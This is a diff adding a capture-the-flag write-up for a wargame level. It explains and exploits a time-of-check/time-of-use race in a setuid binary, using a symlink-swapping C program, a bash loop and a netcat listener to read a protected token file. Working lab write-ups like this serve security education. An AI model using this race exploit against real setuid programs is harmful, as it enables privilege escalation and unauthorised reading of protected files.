@@ -313,3 +313,86 @@ su flag09
 # get the flag
 getflag
 ```
+
+## Data has a need for speed (level10)
+
+This one contains the usual setuid binary (decompiled
+[source code](level10/Resources/source.c)) and an unreadable token. The binary
+takes two arguments, the file and a host. We can see from the source that there
+is an access check to see if the user is authorized to read the file. If the
+test passes, the program goes on to establish a connection to the provided host,
+reads the file contents and sends it to the given host on port 6969. Since the
+level10 user does not have access to the file, we need to find a way to
+circumvent the access check.
+
+The way to do is this is to create a symlink to a file on which level10 user has
+access. Then during the time it takes to establish the connection we can remove
+the symlink and create a new one pointing to the token file. This is possible
+because open will work on the token file since the program has the setuid bit
+on.
+
+Since this level uses a socket connection we will use
+[nc](https://www.unix.com/man-page/Linux/1/netcat/) to read the file. We can do
+this locally on the vm. We just need to use `0.0.0.0` as a host and to setup a
+second ssh connection to the vm to wait for the response:
+
+```shell
+# connect to the vm in an other window
+ssh -p 2222 level10@localhost
+# setup netcat to listen on port 6969
+nc -l 6969
+```
+
+This is the program were going to use for switching the symlink target:
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+
+char	*slink = "/tmp/link";
+char	*file = "/home/user/level10/token";
+
+int main(void)
+{
+	remove(slink);
+	symlink(file, slink);
+	return (0);
+}
+```
+
+And the exploit script that will do all the work for us:
+
+```shell
+# compile the switch_link program
+cd /tmp && gcc switch_link.c
+# create a dummy file to link to
+echo 'dummy' > /tmp/dummy
+
+while true; do
+	# delete the link file if it exists
+	rm -rf /tmp/link
+	# recreate a link that will pass the access test
+	ln -s -T /tmp/dummy /tmp/link
+	# execute the data race command
+	/tmp/a.out | ~/level10 /tmp/link 0.0.0.0 1>&2
+	# wait for the data to be written
+	sleep 1
+done
+```
+
+You just have to execute these commands to pass to the next level:
+
+```shell
+# set permissions for convenience (on the vm)
+chmod 755 .
+# copy the switch_link file to the vm (on the host)
+scp -P 2222 level10/switch_link.c level10@localhost:/tmp
+# copy the exploit script to the vm (on the host too)
+scp -P 2222 level10/exploit.bash level10@localhost:~
+# execute the exploit (back on the vm)
+./exploit.bash
+# stop the script when the token appears and log as flag10
+su flag10
+# get the flag
+getflag
+```
